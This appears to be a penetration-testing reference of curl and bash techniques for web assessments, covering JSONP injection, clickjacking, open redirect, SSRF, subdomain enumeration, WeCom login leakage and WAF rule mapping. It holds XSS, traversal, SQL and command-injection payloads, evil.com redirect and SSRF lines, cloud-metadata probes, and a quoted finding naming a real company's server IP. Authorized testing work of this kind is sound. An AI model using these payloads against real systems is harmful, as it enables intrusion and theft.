# Penetration Testing Techniques Reference

Active testing techniques for authorized security assessments. Each section includes: what to test, how to test, what to look for, and common pitfalls.

## JSONP Callback Injection

**What**: APIs that accept a `callback` parameter and wrap the response in a JavaScript function call.

**Test**:
```bash
# Step 1: Find JSONP-capable endpoints (grep JS for ?callback= or &callback=)
curl -s https://DOMAIN/js/app.js | grep -oiE '(callback|jsonp)[^"]*'

# Step 2: Test with arbitrary function name
curl -s "https://DOMAIN/api/endpoint?callback=myFunc"
# Vulnerable: myFunc({"data":"sensitive"})
# Safe: {"data":"sensitive"}  (callback ignored)

# Step 3: Verify XSS-capable callbacks are blocked
curl -s "https://DOMAIN/api/endpoint?callback=<script>alert(1)</script>"
# WAF blocks = 405, passes = reflected XSS
```

**Exploitation**: Attacker hosts a page with `<script src="https://DOMAIN/api?callback=stealData"></script>` where `stealData` exfiltrates the response to attacker's server.

**Pitfall**: WAFs often block `<script>` tags and `document.location` in callback params but allow plain alphanumeric function names. The vulnerability is still exploitable with benign-looking function names — the attack happens on the attacker's domain, not the target.

**Fix**: Whitelist callback values, or better yet, replace JSONP with proper CORS headers.

---

## Clickjacking

**What**: Page can be embedded in an iframe on a malicious site, enabling UI redress attacks.

**Test**:
```bash
# Check for frame protections
curl -sI https://DOMAIN/page | grep -iE "(x-frame-options|content-security-policy.*frame-ancestors)"
# Empty = vulnerable

# Generate PoC (save as HTML, open in browser):
cat > /tmp/clickjack_poc.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<h1>Clickjacking PoC - TARGET_DOMAIN</h1>
<iframe src="https://TARGET_DOMAIN/page" width="1000" height="600"
        style="opacity:0.1; position:absolute; top:0; left:0;"></iframe>
<div style="position:relative; z-index:1;">
    <button style="padding:20px 40px; font-size:20px;">Click for prize!</button>
</div>
</body>
</html>
EOF
```

**Note**: `X-Frame-Options: ALLOW-FROM *.domain.com` is **deprecated** — Chrome, Firefox, Edge all ignore it. Only CSP `frame-ancestors` works. If the site uses ALLOW-FROM, it's effectively unprotected.

---

## Open Redirect

**What**: Login page accepts a `redirectURL` (or similar) parameter that can be manipulated to redirect users to malicious sites after authentication.

**Test payloads** (in order of likelihood to bypass filters):
1. `https://evil.com` — direct external URL
2. `//evil.com` — protocol-relative URL
3. `https://DOMAIN.evil.com` — subdomain of attacker domain
4. `https://DOMAIN@evil.com` — userinfo trick
5. `javascript:alert(1)` — JS protocol (rarely works)
6. `data:text/html,<script>alert(1)</script>` — data URI (rarely works)

**Test method**:
```bash
# Check if redirect happens immediately (302) or after login (stored in page)
curl -sI "https://DOMAIN/login?redirectURL=https://evil.com" | head -5
# 302 to evil.com = immediate redirect (higher risk)
# 200 with evil.com in body = stored redirect (still exploitable post-login)
# 200 without evil.com = filtered/safe
```

**Pitfall**: Some sites validate redirectURL on the server but still embed it in the page HTML (e.g., as a hidden form field or JS variable). Always check the response body, not just headers.

---

## Login Page Security

### Rate Limiting
```bash
# Send 10 rapid requests, check for 429/lockout
for i in $(seq 1 10); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://DOMAIN/login")
  echo "Request $i: $code"
  # If all return 200, no rate limiting
done
```

### CSRF Protection
```bash
# Check for CSRF tokens in login form
curl -s "https://DOMAIN/login" | grep -oiE '(csrf|_token|authenticity|nonce|hidden.*name.*token)'
# Check if login POST requires a token
curl -s -X POST "https://DOMAIN/login" -d "user=test&pass=test" | head -5
```

### Account Enumeration
```bash
# Test if different error messages for valid vs invalid usernames
curl -s -X POST "https://DOMAIN/login" -d "user=admin&pass=wrong" | grep -i "error\|invalid\|not found"
curl -s -X POST "https://DOMAIN/login" -d "user=nonexistent&pass=wrong" | grep -i "error\|invalid\|not found"
# Different messages = username enumeration vulnerability
```

---

## Subdomain Enumeration

**DNS-based enumeration** (passive, no direct connection to target):
```bash
# Basic — use a wordlist of common prefixes
# Top 50 most productive prefixes for Chinese corporate sites:
for sub in www api uac admin test dev staging beta app mobile web portal sso \
  login monitor analytics grafana jenkins gitlab ci cd wap mini h5 club act \
  es redis mysql gateway gw node m cdn static img res js css \
  mail smtp imap pop3 ftp ssh vpn db backup old new v1 v2 v3 \
  order user member center hub core sys system cloud storage oss; do
  result=$(dig +short "${sub}.DOMAIN" 2>/dev/null | head -1)
  [ -n "$result" ] && echo "${sub}.DOMAIN -> $result"
done
```

**PITFALL**: Subdomains returning CNAME to WAF providers (e.g., `*.yundunwaf*.com`, `*.eo.dnse0.cn`) still exist and are worth investigating — they're behind a WAF but the application behind the WAF may have its own vulnerabilities.

**What to do with found subdomains**:
1. Check HTTP response headers for server/framework info
2. Probe common paths (/admin, /api, /actuator, /swagger-ui.html)
3. Check for subdomain takeover (CNAME pointing to decommissioned cloud services)
4. Check if the subdomain resolves to a direct IP (not behind CDN/WAF) — higher attack surface

---

## SSRF Probing

**What**: Server-side request forgery via URL parameters, file upload, or webhook callbacks.

**Test targets**:
```bash
# URL parameters that might fetch external resources
curl -s "https://DOMAIN/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://DOMAIN/api/proxy?target=http://internal-server:8080"
curl -s "https://DOMAIN/api/import?source=http://evil.com/redirect"

# Callback parameters (webhooks, notifications)
curl -s "https://DOMAIN/api/webhook?callback=http://169.254.169.254"

# File upload with URL
curl -s -X POST "https://DOMAIN/upload" -F "file=http://169.254.169.254/latest/meta-data/"
```

**Cloud metadata endpoints** (if SSRF confirmed):
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- Alibaba: `http://100.100.100.200/latest/meta-data/`

---

## WebSocket Discovery

```bash
# Check common WebSocket paths
for path in /ws /wss /websocket /socket.io /ws/chat /ws/notify /sockjs /signalr; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 \
    -H "Upgrade: websocket" -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Version: 13" \
    "https://DOMAIN${path}")
  echo "$path -> $code"
done
# 101 = WebSocket upgrade successful
# 400/426 = endpoint exists but rejected upgrade
# 404 = not found
# 405 = WAF blocked
```

---

## Framework Fingerprinting via Error Pages

```bash
# Trigger a 404 on a non-existent path
curl -s "https://DOMAIN/this-path-definitely-does-not-exist-12345"

# Spring Boot: {"timestamp":...,"status":404,"error":"Not Found","path":"..."}
# Express.js: Cannot GET /path
# Django: Using the URLconf defined in...
# ASP.NET: Server Error in '/' Application
# Laravel: Sorry, the page you are looking for could not be found
# Ruby on Rails: Routing Error
```

---

## WeCom / WeChat Login Information Disclosure

**What**: Enterprise WeChat (企业微信/WeCom) and WeChat login endpoints often leak internal infrastructure details when handling invalid authentication codes.

**Test**:
```bash
# Step 1: Find login endpoints (check JS, Excel asset lists, or enumerate)
curl -s -X POST "https://DOMAIN/pub/signal/qyLogin" -H "Content-Type: application/json" -d '{"code":"invalid_code"}'
curl -s -X POST "https://DOMAIN/pub/signal/wxLogin" -H "Content-Type: application/json" -d '{"code":"invalid_code"}'
curl -s -X POST "https://DOMAIN/api/wechat/callback" -H "Content-Type: application/json" -d '{"code":"test"}'

# Step 2: Analyze error response for information leakage
# VULNERABLE response example (actual finding from China Unicom Beijing):
# {
#   "code": 30008,
#   "message": "errCode:030010,errMsg:40029:invalid code, hint: [1782316307617340314383562], from ip: 116.133.3.81, more info at https://open.work.weixin.qq.com/devtool/query?e=40029"
# }

# What to look for:
# - Internal IP addresses (e.g., "from ip: 10.x.x.x" or public-facing server IPs)
# - WeChat/WeCom error codes (40029 = invalid code, reveals API version)
# - Request tracking/hint IDs (can be used for correlation attacks)
# - API documentation URLs (reveals which WeChat API version is in use)
# - Internal server names or hostnames
```

**Impact**:
- Internal IP disclosure enables targeted network attacks
- WeCom API version disclosure helps craft specific exploit payloads
- Hint/tracking IDs may be correlatable across requests

**Fix**: Catch all WeChat/WeCom API errors server-side and return generic messages like "Login failed, please try again". Log detailed errors server-side only.

---

## API Endpoint Enumeration via JavaScript (SPA Apps)

**What**: Vue/React/Angular SPAs often expose all API endpoints in their JavaScript bundles. Extracting these reveals the full attack surface.

**Test**:
```bash
# Step 1: Find JS bundle URLs from HTML source
curl -s https://DOMAIN/page | grep -oE 'src="[^"]*\.js"'

# Step 2: Download and extract API paths
curl -s https://DOMAIN/static/js/app.HASH.js | grep -oE '"[/][a-zA-Z]+[/][a-zA-Z/]+"' | sort -u

# Step 3: Extract from chunk files (lazy-loaded routes)
curl -s https://DOMAIN/static/js/chunk-HASH.js | grep -oE '"https?://[^"]*"' | sort -u

# Step 4: Test all discovered endpoints
for endpoint in $(cat discovered_endpoints.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://DOMAIN${endpoint}")
  echo "$code $endpoint"
done
```

**What to look for**:
- Login/auth endpoints (wxLogin, qyLogin, smsLogin)
- Admin endpoints (manage, config, settings)
- Data export endpoints (export, download, report)
- Debug/test endpoints (debug, test, health)
- Internal API URLs (http://internal-server:port/)

**Pitfall**: SPA catch-all routing returns 200 for ALL paths. Distinguish real API endpoints (return JSON) from SPA routes (return HTML with `<div id="app">`):
```bash
curl -s https://DOMAIN/api/endpoint | head -1 | grep -q "^{" && echo "JSON API" || echo "SPA route"
```

---

## WAF Rule Mapping

After detecting a WAF, systematically map what it blocks:

```bash
# Test categories
tests=(
  "xss-tag:<script>alert(1)</script>"
  "xss-event:<img onerror=alert(1) src=x>"
  "js-protocol:javascript:alert(1)"
  "data-uri:data:text/html,<script>alert(1)</script>"
  "path-traversal:../../../etc/passwd"
  "sqli:' OR 1=1--"
  "cmd-injection:; ls -la"
  "ssrf:http://169.254.169.254"
  "json-ext:.json"
  "yml-ext:.yml"
  "env-file:.env"
  "git-config:.git/config"
  "callback-inject:callback=<script>"
  "callback-normal:callback=test123"
)

for test in "${tests[@]}"; do
  name="${test%%:*}"
  payload="${test#*:}"
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://DOMAIN/test?x=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")
  echo "$name -> $code"
done
```

Map results: 405 = blocked, 200/301/302 = passed, 404 = not found (path doesn't exist), 403 = forbidden.
